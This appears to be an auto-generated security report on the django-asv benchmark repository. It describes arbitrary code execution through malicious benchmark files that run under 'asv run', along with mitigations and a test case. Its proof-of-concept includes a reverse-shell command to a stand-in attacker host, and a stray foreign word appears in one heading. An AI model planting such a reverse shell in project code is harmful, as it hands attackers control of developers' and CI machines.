### Consolidated Vulnerability List

#### 1. Arbitrary Code Execution via Malicious Benchmarks

*   **Description:**
    1.  An attacker forks the `django-asv` repository.
    2.  The attacker creates a new directory under `/benchmarks/`, or modifies an existing benchmark file (e.g., `/code/benchmarks/model_benchmarks/model_delete/benchmark.py`) or the `bench_setup` utility function (`/code/benchmarks/utils.py`).
    3.  Inside this directory or file, the attacker crafts `benchmark.py` to contain malicious Python code within a benchmark class and its methods (like `setup`, `time_*`, `mem_*`). This code can perform any action the developer's user has permissions to execute.
    4.  The attacker submits a pull request to the main repository with these changes, or socially engineers a developer into cloning and running benchmarks from the attacker's forked repository, perhaps by suggesting testing "performance improvements".
    5.  A developer, wanting to contribute or review the benchmarks, merges the pull request or clones the attacker's branch and navigates to the `/code` directory.
    6.  The developer installs `asv` and any other necessary dependencies as described in the `README.md`.
    7.  The developer executes the command `asv run` to run the benchmarks locally or in a CI environment.
    8.  `asv` automatically discovers and executes the benchmark code located in `benchmark.py` files, including the malicious benchmark introduced by the attacker.
    9.  The malicious code within `benchmark.py` is executed with the same privileges as the user running `asv run`, achieving arbitrary code execution on the developer's machine or the CI environment.

*   **Impact:**
    *   Successful exploitation allows the attacker to execute arbitrary code on the developer's machine or CI environment.
    *   This can lead to a critical compromise, including:
        *   **Confidentiality Breach:** Exfiltration of sensitive data from the developer's local machine or the CI environment, such as environment variables, secrets, source code, or other files accessible to the user running the benchmarks.
        *   **Integrity Violation:** Modification or deletion of critical files or configurations on the system.
        *   **Availability Disruption:** System compromise, potentially leading to denial of service or disruption of development workflows.
        *   **Malware Installation:** Installation of persistent malware, such as backdoors, keyloggers, or ransomware, on the developer's system.
        *   **Supply Chain Compromise:** Potential to inject malicious code into the developer's contributions, which could later be merged into the main project, or if the CI environment is compromised, it could be leveraged to inject malicious code into the Django project itself or its dependencies, leading to a broader supply chain attack.
        *   **Credential Theft:** The attacker could steal credentials stored on the developer's machine, granting access to other systems and accounts.

*   **Vulnerability Rank:** Critical

*   **Currently Implemented Mitigations:**
    *   None. The project currently lacks any specific security measures to prevent the execution of arbitrary code from benchmarks.
    *   The project relies solely on the assumption that pull requests will be reviewed for correctness and benign intent, but there are no specific security measures in place to prevent or detect malicious benchmark code execution.
    *   The `README.md` provides instructions for contributing and running benchmarks, which implicitly suggests code review as part of the pull request process. However, there is no explicit mention of security-focused code review or guidelines to prevent malicious benchmarks, nor any security warnings about running code from untrusted sources.

*   **Missing Mitigations:**
    *   ** усиленный Code Review with Security Focus:** Implement mandatory, in-depth code reviews for all pull requests, specifically focusing on the security implications of benchmark code. Reviewers should be trained to identify potentially malicious code patterns in benchmark files. This is the most crucial mitigation.
    *   **Security Warning Documentation:** Add a prominent warning in the `README.md` and contribution guidelines about the security risks of running benchmarks from forked repositories or untrusted sources. This warning should advise developers to carefully review and understand the code before running `asv run`, especially from forked repositories.
    *   **Sandboxed Benchmark Execution:** Isolate the benchmark execution environment using sandboxing technologies. This could involve:
        *   **Containerization:** Running benchmarks within containers (like Docker, Podman) with restricted capabilities and resource limits.
        *   **Virtualization:** Executing benchmarks in virtual machines with minimal necessary tools and network access, offering a stronger isolation layer.
        *   **Restricted User Accounts:** Running benchmarks under dedicated, low-privilege user accounts with limited permissions on the system. Recommend or enforce the use of sandboxed environments (like Docker, VMs, or dedicated testing environments) for running benchmarks, especially when testing contributions from external sources. This would limit the potential impact of malicious code execution to the isolated environment. However, this might be complex to set up for performance benchmarking and could impact the accuracy of the benchmark results.
    *   **Static Analysis Security Testing (SAST):** Integrate static analysis tools into the development workflow to automatically scan benchmark code for suspicious patterns or known security vulnerabilities before execution. Tools could be configured to detect potentially dangerous function calls (e.g., `os.system`, `subprocess.call`, `eval`, `exec`) within benchmark files. Integrate static analysis tools or security scanners into the development workflow to automatically detect potentially suspicious code patterns in benchmark contributions.
    *   **Principle of Least Privilege:** Grant only the necessary permissions to the benchmark execution environment and processes. Avoid running benchmarks with highly privileged accounts. Advise developers to run benchmark tools under a user account with restricted privileges to minimize the potential damage from code execution vulnerabilities.
    *   **Input Validation (in a broader sense):** While traditional input validation isn't directly applicable to code, the code review process acts as a form of validation to ensure the submitted code is safe and adheres to project standards. If benchmark definitions or parameters are ever sourced from external inputs (which is not apparent in the current project, but as a future consideration), ensure proper validation and sanitization to prevent injection attacks.

*   **Preconditions:**
    *   **Pull Request Submission:** The attacker must be able to submit a pull request to the `django-asv` repository (which is generally open to contributions).
    *   **Pull Request Merging or Social Engineering:** A maintainer or developer with merge privileges must merge the malicious pull request into the main repository. This often relies on human review, which can be bypassed if the malicious code is cleverly disguised or reviewers are not security-minded. Alternatively, the attacker must successfully socially engineer a Django developer to clone and run benchmarks from a forked repository controlled by the attacker.
    *   **`asv` Installation:** The target developer must have `airspeed velocity` (asv) installed in their development environment.
    *   **Benchmark Execution:**  Someone (developer or CI system) must subsequently execute the benchmarks using `asv run` after the malicious code has been merged into the codebase or cloned locally. This is a standard part of the benchmarking workflow, so it's a highly likely precondition to be met.
    *   The developer must have write permissions in their local environment for the malicious code to have a significant impact (e.g., to create files, install software, etc.).

*   **Source Code Analysis:**
    1.  **`README.md` and Contribution Guidelines**: The "Writing New Benchmarks And Contributing" section clearly outlines how to add new benchmarks by creating a directory and `benchmark.py` file. It also instructs to add the directory to `INSTALLED_APPS` in `settings.py`. The `README.md` explicitly encourages contributions by describing how to write new benchmarks and submit pull requests. This lowers the barrier for attackers to submit malicious benchmarks.
    2.  **`benchmarks/utils.py`**: The `bench_setup()` function is used across benchmarks. While it sets up the Django environment using `django.setup()`, it doesn't inherently introduce the vulnerability but provides a rich context for potential exploits if the attacker wants to interact with Django functionalities. If an attacker modifies this function, the malicious code will be executed at the beginning of almost every benchmark run as it's imported and used by almost all benchmark files in their `setup()` methods.
    3.  **Benchmark files (e.g., `/code/benchmarks/model_benchmarks/model_delete/benchmark.py`):** The `setup()` method in benchmark classes is automatically executed by `asv run`. An attacker can inject malicious code directly into the `setup()` method of any benchmark file or `time_*()` methods.
    4.  **`asv run` command**: The `asv run` command, as documented in the `README.md` and the airspeed velocity tool documentation, is designed to discover and execute benchmarks within the project. It is expected behavior for `asv run` to execute the code in `benchmark.py` files. When a developer executes `asv run`, `asv` discovers and executes benchmark classes and their methods within the project. This execution includes the `setup()` methods of benchmark classes, which are intended for setting up the benchmark environment.
    5.  **Lack of Sandboxing**: The project and `asv` tool, by default, execute benchmarks directly in the developer's environment without any sandboxing or isolation. This direct execution is the root cause of the arbitrary code execution vulnerability. `asv` doesn't perform any security checks on the content of these `benchmark.py` files. The `asv run` command simply discovers and executes the Python code.
    6.  **No Security Checks**: There are no automated checks or security measures in place to validate the contents of `benchmark.py` files before execution.

    Project Repository (django-asv)
    ├── benchmarks/
    │   ├── ...
    │   ├── malicious_benchmark/  <-- Malicious benchmark directory or modification in existing file
    │   │   ├── __init__.py       <-- Makes it a Python package (if new directory)

    ```

    - In `benchmarks/malicious_benchmark/benchmark.py` (or modified existing benchmark file):
    ```python
    import os
    import subprocess

    class MaliciousBenchmark: # or existing Benchmark class
        def setup(self): # or time_* method
            # Example 1: Execute arbitrary shell command
            os.system("whoami > /tmp/whoami_output.txt")
            os.system('touch /tmp/pwned_benchmark_code_injection') # Example: Creates a file to indicate code execution

            # Example 2: Reverse shell (simplified, requires attacker to listen on port 4444)
            subprocess.Popen(["/bin/bash", "-c", "bash -i >& /dev/tcp/attacker.example.com/4444 0>&1"])

        def time_harmless_benchmark(self): # Name doesn't matter, setup is executed regardless of benchmark function run
            pass # Harmless benchmark code
    ```
    - When `asv run` is executed, the `setup()` method of `MaliciousBenchmark` (or modified benchmark) will be executed, running the malicious code.

*   **Security Test Case:**
    1.  **Setup Test Environment:**  Set up a local development environment for `django-asv` as described in the `README.md`.
    2.  **Fork the Repository:** Fork the `django-asv` repository on GitHub to your personal account.
    3.  **Create Malicious Benchmark File (or modify existing):** In your forked repository, create a new directory `benchmarks/malicious_benchmark/` and add `__init__.py` (empty) and `benchmark.py` with the following content:
        ```python
        import os

        class MaliciousBenchmark:
            def setup(self):
                os.system("touch /tmp/pwned_benchmark_code_injection")

            def time_malicious(self):
                pass
        ```
        Alternatively, modify an existing benchmark file (e.g., `/code/benchmarks/model_benchmarks/model_delete/benchmark.py`) or `benchmarks/utils.py` to inject the `os.system("touch /tmp/pwned_benchmark_code_injection")` line into the `setup()` method or `bench_setup()` function respectively.
    4.  **Include the new benchmark in settings:** If you created a new benchmark, edit the `benchmarks/settings.py` file and add `'benchmarks.malicious_benchmark'` to the `INSTALLED_APPS` list.
    5.  **Commit and Create a Pull Request (Optional for Local Testing):** Commit your changes and create a pull request to the upstream `django-asv` repository (or just test locally in your forked repository if you don't want to create a PR).
    6.  **Run Benchmarks Locally:** Clone your forked repository (or the main one if you submitted and merged the PR for testing). Navigate to the `code/` directory in your local clone of the repository and run the command `asv run`.
    7.  **Verify Code Execution:** After the `asv run` command completes, check if the file `/tmp/pwned_benchmark_code_injection` has been created in your system's `/tmp/` directory. Use the command `ls /tmp/pwned_benchmark_code_injection`.
    8.  **Expected Result:** If the file `/tmp/pwned_benchmark_code_injection` exists, it confirms that the malicious code within the `setup()` method of the `MaliciousBenchmark` class (or injected into the modified file) has been successfully executed by `asv run`, demonstrating the Arbitrary Code Execution via Malicious Benchmarks vulnerability. You should also observe the output of `asv run` for any print statements added in the malicious code for further confirmation. For a less intrusive test, you could modify the malicious benchmark to simply print to standard output instead of writing a file.

This test case demonstrates that simply adding a new benchmark file with malicious code (or modifying existing benchmark files or `utils.py`) and running `asv run` results in the execution of that code, confirming the Arbitrary Code Execution vulnerability.
